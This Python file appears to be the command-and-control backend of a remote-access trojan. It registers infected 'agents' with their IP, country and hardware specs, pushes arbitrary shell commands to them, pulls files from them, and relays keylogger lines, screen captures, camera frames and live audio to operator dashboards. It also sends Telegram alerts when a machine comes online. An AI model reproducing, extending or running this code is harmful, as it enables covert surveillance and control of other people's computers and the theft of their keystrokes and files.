import json
from typing import Dict, Any, List, Set
from fastapi import WebSocket
import asyncio
import aiofiles
import os
import uuid
import httpx
from telegram_notify import send_telegram

AGENTS_FILE = os.path.join(os.path.dirname(__file__), 'config', 'agents.json')
BLACKLIST_FILE = os.path.join(os.path.dirname(__file__), 'config', 'blacklist.json')

class AgentManager:
    def __init__(self) -> None:
        self.agents: Dict[str, Dict[str, Any]] = {}
        self.dashboards: Set[WebSocket] = set()
        self._lock = asyncio.Lock()
        self._pending_stats: Dict[str, asyncio.Future] = {}
        self._pending_download: Dict[str, asyncio.Future] = {}
        self._blacklist: Set[str] = set()
        # One-shot exec capture per agent (stdout/stderr/exit) for master-initiated commands
        self._captures: Dict[str, Dict[str, Any]] = {}
        # Ensure config dir/files exist
        os.makedirs(os.path.join(os.path.dirname(__file__), 'config'), exist_ok=True)
        if not os.path.exists(AGENTS_FILE):
            with open(AGENTS_FILE, 'w', encoding='utf-8') as f:
                json.dump([], f)
        if not os.path.exists(BLACKLIST_FILE):
            with open(BLACKLIST_FILE, 'w', encoding='utf-8') as f:
                json.dump([], f)
        else:
            try:
                with open(BLACKLIST_FILE, 'r', encoding='utf-8') as f:
                    self._blacklist = set(json.load(f) or [])
            except Exception:
                self._blacklist = set()
        # Load any previously persisted agents as offline entries
        try:
            with open(AGENTS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f) or []
            if isinstance(data, list):
                for entry in data:
                    try:
                        aid = entry.get('agent_id')
                        if not aid:
                            continue
                        self.agents[aid] = {
                            'socket': None,
                            'name': entry.get('name') or aid,
                            'alias': entry.get('alias') or None,
                            'http_base': entry.get('http_base'),
                            'has_camera': bool(entry.get('has_camera')),
                            'country': entry.get('country'),
                            'country_code': entry.get('country_code'),
                        }
                    except Exception:
                        continue
        except Exception:
            pass

    async def register_dashboard(self, ws: WebSocket) -> None:
        async with self._lock:
            self.dashboards.add(ws)
        await self.broadcast_agents()

    async def remove_dashboard(self, ws: WebSocket) -> None:
        async with self._lock:
            self.dashboards.discard(ws)

    async def register_agent(self, agent_id: str, name: str, http_base: str, ws: WebSocket, has_camera: bool = False, country: str | None = None, country_code: str | None = None, public_ip: str | None = None) -> None:
        async with self._lock:
            prev = self.agents.get(agent_id, {})
            was_online = bool(prev.get("socket"))
            self.agents[agent_id] = {
                "socket": ws,
                "name": name or prev.get("name") or agent_id,
                "alias": prev.get("alias"),
                "http_base": http_base or prev.get("http_base"),
                "has_camera": bool(has_camera) if has_camera is not None else bool(prev.get("has_camera")),
                "country": country if country is not None else prev.get("country"),
                "country_code": country_code if country_code is not None else prev.get("country_code"),
                "public_ip": public_ip if public_ip is not None else prev.get("public_ip"),
            }
        await self.persist_agents()
        await self.broadcast_agents()
        # Notify on first online transition with specs if possible
        try:
            if not was_online:
                alias = self.agents.get(agent_id, {}).get("alias")
                nm = alias or name or agent_id
                ip = public_ip or self.agents.get(agent_id, {}).get("public_ip")
                specs = await self._try_fetch_specs_http(agent_id)
                if not specs:
                    specs = await self._try_fetch_specs_ws(agent_id)
                if specs:
                    cpu = (specs.get('cpu') or '').strip() or 'unknown'
                    gpu = (specs.get('gpu') or '').strip() or 'unknown'
                    rb = int(specs.get('ram_bytes') or 0)
                    ram_gib = (rb / (1024**3)) if rb else 0.0
                    ram_txt = f"{ram_gib:.1f} GiB" if rb else 'unknown'
                    msg = f"\u2705 <b>Agent online</b>\nName: <code>{nm}</code>\nID: <code>{agent_id}</code>\nIP: <code>{ip or 'unknown'}</code>\nCPU: <code>{cpu}</code>\nRAM: <code>{ram_txt}</code>\nGPU: <code>{gpu}</code>"
                else:
                    msg = f"\u2705 <b>Agent online</b>\nName: <code>{nm}</code>\nID: <code>{agent_id}</code>\nIP: <code>{ip or 'unknown'}</code>"
                await send_telegram(msg)
        except Exception:
            pass

    async def remove_agent(self, agent_id: str) -> None:
        # Backwards-compat: full removal (used by explicit clear)
        async with self._lock:
            if agent_id in self.agents:
                self.agents.pop(agent_id, None)
        await self.persist_agents()
        await self.broadcast_agents()

    async def mark_offline(self, agent_id: str) -> None:
        name = None
        async with self._lock:
            if agent_id in self.agents:
                try:
                    name = self.agents[agent_id].get("alias") or self.agents[agent_id].get("name")
                    self.agents[agent_id]["socket"] = None
                except Exception:
                    self.agents[agent_id] = {k: v for k, v in self.agents[agent_id].items() if k != "socket"}
        await self.persist_agents()
        await self.broadcast_agents()
        try:
            nm = name or agent_id
            # include last known specs if recorded
            info = self.agents.get(agent_id, {}) if hasattr(self, 'agents') else {}
            cpu = info.get('specs', {}).get('cpu') if isinstance(info.get('specs'), dict) else None
            rb = info.get('specs', {}).get('ram_bytes') if isinstance(info.get('specs'), dict) else None
            gpu = info.get('specs', {}).get('gpu') if isinstance(info.get('specs'), dict) else None
            ram_txt = f"{(int(rb)/(1024**3)):.1f} GiB" if isinstance(rb, (int, float)) and int(rb) > 0 else None
            extra = ''
            if cpu or gpu or ram_txt:
                extra = "\n" + "\n".join([
                    f"CPU: <code>{cpu}</code>" if cpu else None,
                    f"RAM: <code>{ram_txt}</code>" if ram_txt else None,
                    f"GPU: <code>{gpu}</code>" if gpu else None,
                ]).replace('\nNone','').replace('None','')
            await send_telegram(f"\u26D4\ufe0f <b>Agent offline</b>\nName: <code>{nm}</code>\nID: <code>{agent_id}</code>{extra}")
        except Exception:
            pass

    async def clear_agent(self, agent_id: str) -> None:
        await self.remove_agent(agent_id)

    async def set_alias(self, agent_id: str, alias: str | None) -> None:
        async with self._lock:
            if agent_id not in self.agents:
                # create skeleton to persist alias even if not connected yet
                self.agents[agent_id] = {"socket": None, "name": agent_id, "alias": alias}
            else:
                self.agents[agent_id]["alias"] = (alias or None)
        await self.persist_agents()
        await self.broadcast_agents()

    async def force_disconnect_agent(self, agent_id: str) -> None:
        ws: WebSocket | None = None
        async with self._lock:
            entry = self.agents.get(agent_id)
            if entry:
                ws = entry.get("socket")
        try:
            if ws:
                await ws.close()
        except Exception:
            pass
        # Mark offline and broadcast (do not clear from registry)
        await self.mark_offline(agent_id)

    async def persist_agents(self) -> None:
        agents_list = await self.get_agents()
        async with aiofiles.open(AGENTS_FILE, 'w') as f:
            await f.write(json.dumps(agents_list, indent=2))

    async def get_agents(self) -> List[Dict[str, Any]]:
        async with self._lock:
            out: List[Dict[str, Any]] = []
            for aid, info in self.agents.items():
                try:
                        out.append({
                            "agent_id": aid,
                            "name": info.get("name"),
                            "alias": info.get("alias"),
                            "http_base": info.get("http_base"),
                            "has_camera": bool(info.get("has_camera")),
                            "country": info.get("country"),
                            "country_code": info.get("country_code"),
                            "public_ip": info.get("public_ip"),
                            "online": bool(info.get("socket")),
                        })
                except Exception:
                    out.append({"agent_id": aid, "name": aid, "online": False})
            return out

    # Blacklist management
    async def is_blacklisted(self, agent_id: str) -> bool:
        async with self._lock:
            return agent_id in self._blacklist

    async def get_blacklist(self) -> List[str]:
        async with self._lock:
            return sorted(list(self._blacklist))

    async def add_blacklist(self, agent_id: str) -> None:
        async with self._lock:
            self._blacklist.add(agent_id)
            try:
                with open(BLACKLIST_FILE, 'w', encoding='utf-8') as f:
                    json.dump(sorted(list(self._blacklist)), f, indent=2)
            except Exception:
                pass

    async def remove_blacklist(self, agent_id: str) -> None:
        async with self._lock:
            self._blacklist.discard(agent_id)
            try:
                with open(BLACKLIST_FILE, 'w', encoding='utf-8') as f:
                    json.dump(sorted(list(self._blacklist)), f, indent=2)
            except Exception:
                pass

    async def broadcast_agents(self) -> None:
        payload = {"type": "agents", "agents": await self.get_agents()}
        await self._broadcast_to_dashboards(payload)

    async def _broadcast_to_dashboards(self, payload: Dict[str, Any]) -> None:
        stale: List[WebSocket] = []
        for ws in list(self.dashboards):
            try:
                await ws.send_json(payload)
            except Exception:
                stale.append(ws)
        for ws in stale:
            await self.remove_dashboard(ws)

    async def forward_command(self, agent_id: str, command: str) -> bool:
        async with self._lock:
            entry = self.agents.get(agent_id)
            ws = entry.get("socket") if entry else None
        if not ws:
            return False
        try:
            await ws.send_json({"command": command})
            return True
        except Exception:
            return False

    async def forward_json(self, agent_id: str, payload: Dict[str, Any]) -> bool:
        async with self._lock:
            entry = self.agents.get(agent_id)
            ws = entry.get("socket") if entry else None
        if not ws:
            return False
        try:
            await ws.send_json(payload)
            return True
        except Exception:
            return False

    async def request_stats(self, agent_id: str, session_id: str | None = None) -> Dict[str, Any]:
        async with self._lock:
            entry = self.agents.get(agent_id)
            ws = entry.get("socket") if entry else None
        if not ws:
            return {"error": "Agent not connected"}
        req_id = str(uuid.uuid4())
        fut: asyncio.Future = asyncio.get_event_loop().create_future()
        self._pending_stats[req_id] = fut
        try:
            payload = {"type": "stats_request", "request_id": req_id}
            if isinstance(session_id, str) and session_id:
                payload["session_id"] = session_id
            await ws.send_json(payload)
        except Exception as e:
            self._pending_stats.pop(req_id, None)
            return {"error": f"Failed to send request: {e}"}
        try:
            data = await asyncio.wait_for(fut, timeout=10.0)
            return data if isinstance(data, dict) else {"data": data}
        except asyncio.TimeoutError:
            self._pending_stats.pop(req_id, None)
            return {"error": "Timed out waiting for stats"}

    async def complete_stats_request(self, request_id: str, payload: Dict[str, Any]) -> None:
        fut = self._pending_stats.pop(request_id, None)
        if fut and not fut.done():
            fut.set_result(payload)

    async def request_download(self, agent_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        async with self._lock:
            entry = self.agents.get(agent_id)
            ws = entry.get("socket") if entry else None
        if not ws:
            return {"error": "Agent not connected"}
        req_id = str(uuid.uuid4())
        fut: asyncio.Future = asyncio.get_event_loop().create_future()
        self._pending_download[req_id] = fut
        try:
            payload = {"type": "download_request", "request_id": req_id}
            try:
                for k in ("name","dir","path"):
                    if k in params and params.get(k) is not None:
                        payload[k] = params.get(k)
            except Exception:
                pass
            await ws.send_json(payload)
        except Exception as e:
            self._pending_download.pop(req_id, None)
            return {"error": f"Failed to send request: {e}"}
        try:
            data = await asyncio.wait_for(fut, timeout=30.0)
            return data if isinstance(data, dict) else {"data": data}
        except asyncio.TimeoutError:
            self._pending_download.pop(req_id, None)
            return {"error": "Timed out waiting for download"}

    async def complete_download_request(self, request_id: str, payload: Dict[str, Any]) -> None:
        fut = self._pending_download.pop(request_id, None)
        if fut and not fut.done():
            fut.set_result(payload)

    async def relay_output_to_dashboards(self, agent_id: str, output: str) -> None:
        await self._broadcast_to_dashboards({"type": "log", "agent_id": agent_id, "line": output})

    async def relay_exit_to_dashboards(self, agent_id: str, code: int) -> None:
        await self._broadcast_to_dashboards({"type": "exit", "agent_id": agent_id, "exit_code": code})

    async def relay_screen_to_dashboards(self, agent_id: str, frame: Dict[str, Any]) -> None:
        payload = {"type": "screen_frame", "agent_id": agent_id, **frame}
        await self._broadcast_to_dashboards(payload)

    async def relay_camera_to_dashboards(self, agent_id: str, frame: Dict[str, Any]) -> None:
        payload = {"type": "camera_frame", "agent_id": str(agent_id), **frame}
        await self._broadcast_to_dashboards(payload)

    async def relay_audio_live_to_dashboards(self, agent_id: str, payload: Dict[str, Any]) -> None:
        data = {"type": "audio_live", "agent_id": str(agent_id)}
        try:
            data.update(payload or {})
        except Exception:
            pass
        await self._broadcast_to_dashboards(data)

    async def relay_keylog_to_dashboards(self, agent_id: str, line: str) -> None:
        payload = {"type": "keylog_line", "agent_id": str(agent_id), "line": line}
        await self._broadcast_to_dashboards(payload)

    async def get_agent_http_base(self, agent_id: str) -> str | None:
        async with self._lock:
            entry = self.agents.get(agent_id)
            return entry.get("http_base") if entry else None

    async def _try_fetch_specs_http(self, agent_id: str) -> dict | None:
        http_base = await self.get_agent_http_base(agent_id)
        if not http_base:
            return None
        async def _exec(cmd: str) -> dict | None:
            url = f"{http_base}/execute"
            try:
                async with httpx.AsyncClient(timeout=6.0) as client:
                    r = await client.post(url, json={"command": cmd})
                    if r.status_code != 200:
                        return None
                    return r.json()
            except Exception:
                return None
        # Try Windows PowerShell first
        ps = (
            'powershell -NoLogo -NoProfile -Command '
            '"$cpu=(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name);'
            '$ram=(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum;'
            '$gpu=(Get-CimInstance Win32_VideoController | Select-Object -First 1 -ExpandProperty Name);'
            '$o=@{cpu=$cpu;ram_bytes=$ram;gpu=$gpu};$o|ConvertTo-Json -Compress"'
        )
        res = await _exec(ps)
        data_txt = None
        if res and isinstance(res.get('stdout'), str):
            data_txt = res['stdout'].strip()
        if data_txt and data_txt.startswith('{'):
            try:
                out = json.loads(data_txt)
                await self._store_specs(agent_id, out)
                return out
            except Exception:
                pass
        # Try Linux/macOS shell
        sh = (
            "sh -lc 'CPU=$(grep -m1 \"model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2- | sed \"s/^ //\"); "
            "[ -z \"$CPU\" ] && CPU=$(sysctl -n machdep.cpu.brand_string 2>/dev/null); "
            "RAM=$(grep MemTotal /proc/meminfo 2>/dev/null | awk \"{print $2*1024}\"); "
            "[ -z \"$RAM\" ] && RAM=$(vm_stat 2>/dev/null | awk '/Pages free/ {free=$3} /Pages active/ {act=$3} /page size of/ {ps=$8} END {print (free+act)*ps}' | tr -d '.'); "
            "GPU=$(lspci 2>/dev/null | egrep -i \"vga|3d|display\" | head -n1 | cut -d: -f3- | sed \"s/^ //\"); "
            "[ -z \"$GPU\" ] && GPU=$(system_profiler SPDisplaysDataType 2>/dev/null | awk -F: '/Chipset Model/ {print $2; exit}' | sed \"s/^ //\"); "
            'echo "{\"cpu\":\"${CPU}\",\"ram_bytes\":${RAM:-0},\"gpu\":\"${GPU}\"}"'
        )
        res2 = await _exec(sh)
        data_txt2 = None
        if res2 and isinstance(res2.get('stdout'), str):
            data_txt2 = res2['stdout'].strip()
        if data_txt2 and data_txt2.startswith('{'):
            try:
                out = json.loads(data_txt2)
                await self._store_specs(agent_id, out)
                return out
            except Exception:
                pass
        return None

    async def _store_specs(self, agent_id: str, specs: dict) -> None:
        async with self._lock:
            if agent_id in self.agents:
                d = self.agents[agent_id]
                try:
                    d['specs'] = {
                        'cpu': specs.get('cpu'),
                        'ram_bytes': int(specs.get('ram_bytes') or 0),
                        'gpu': specs.get('gpu'),
                    }
                except Exception:
                    d['specs'] = specs

    # --- Exec capture via agent WS (no agent changes) ---
    async def exec_capture(self, agent_id: str, command: str, timeout: float = 8.0) -> dict:
        async with self._lock:
            entry = self.agents.get(agent_id)
            ws = entry.get("socket") if entry else None
            if not ws:
                return {"error": "Agent not connected"}
            # Allow only one capture per agent at a time
            if agent_id in self._captures:
                return {"error": "capture_busy"}
            fut: asyncio.Future = asyncio.get_event_loop().create_future()
            self._captures[agent_id] = {
                'stdout': [],
                'stderr': [],
                'future': fut,
            }
        # Send the command to the agent
        ok = await self.forward_command(agent_id, command)
        if not ok:
            async with self._lock:
                self._captures.pop(agent_id, None)
            return {"error": "send_failed"}
        try:
            res = await asyncio.wait_for(fut, timeout=timeout)
            return res
        except asyncio.TimeoutError:
            async with self._lock:
                self._captures.pop(agent_id, None)
            return {"error": "timeout"}

    async def on_agent_stream(self, agent_id: str, kind: str, payload: Any) -> None:
        # kind in ('output','error','exit_code')
        cap = None
        async with self._lock:
            cap = self._captures.get(agent_id)
        if not cap:
            return
        try:
            if kind == 'output':
                try:
                    cap['stdout'].append(str(payload))
                except Exception:
                    pass
            elif kind == 'error':
                try:
                    cap['stderr'].append(str(payload))
                except Exception:
                    pass
            elif kind == 'exit_code':
                out = ''.join(cap.get('stdout') or [])
                err = ''.join(cap.get('stderr') or [])
                res = {"stdout": out, "stderr": err, "exit_code": int(payload) if isinstance(payload, (int, float, str)) and str(payload).strip().isdigit() else payload}
                fut = cap.get('future')
                async with self._lock:
                    self._captures.pop(agent_id, None)
                if fut and not fut.done():
                    fut.set_result(res)
        except Exception:
            pass

    async def _try_fetch_specs_ws(self, agent_id: str) -> dict | None:
        # Windows PowerShell attempt
        ps = (
            'powershell -NoLogo -NoProfile -Command '
            '"$cpu=(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name);'
            '$ram=(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum;'
            '$gpu=(Get-CimInstance Win32_VideoController | Select-Object -First 1 -ExpandProperty Name);'
            '$o=@{cpu=$cpu;ram_bytes=$ram;gpu=$gpu};$o|ConvertTo-Json -Compress"'
        )
        res = await self.exec_capture(agent_id, ps, timeout=10.0)
        if isinstance(res, dict) and not res.get('error'):
            txt = (res.get('stdout') or '').strip()
            if txt.startswith('{'):
                try:
                    out = json.loads(txt)
                    await self._store_specs(agent_id, out)
                    return out
                except Exception:
                    pass
        # POSIX attempt
        sh = (
            "sh -lc 'CPU=$(grep -m1 \"model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2- | sed \"s/^ //\"); "
            "[ -z \"$CPU\" ] && CPU=$(sysctl -n machdep.cpu.brand_string 2>/dev/null); "
            "RAM=$(grep MemTotal /proc/meminfo 2>/dev/null | awk \"{print $2*1024}\"); "
            "[ -z \"$RAM\" ] && RAM=$(vm_stat 2>/dev/null | awk '/Pages free/ {free=$3} /Pages active/ {act=$3} /page size of/ {ps=$8} END {print (free+act)*ps}' | tr -d '.'); "
            "GPU=$(lspci 2>/dev/null | egrep -i \"vga|3d|display\" | head -n1 | cut -d: -f3- | sed \"s/^ //\"); "
            "[ -z \"$GPU\" ] && GPU=$(system_profiler SPDisplaysDataType 2>/dev/null | awk -F: '/Chipset Model/ {print $2; exit}' | sed \"s/^ //\"); "
            'echo "{\"cpu\":\"${CPU}\",\"ram_bytes\":${RAM:-0},\"gpu\":\"${GPU}\"}"'
        )
        res2 = await self.exec_capture(agent_id, sh, timeout=8.0)
        if isinstance(res2, dict) and not res2.get('error'):
            txt2 = (res2.get('stdout') or '').strip()
            if txt2.startswith('{'):
                try:
                    out = json.loads(txt2)
                    await self._store_specs(agent_id, out)
                    return out
                except Exception:
                    pass
        return None

manager = AgentManager()
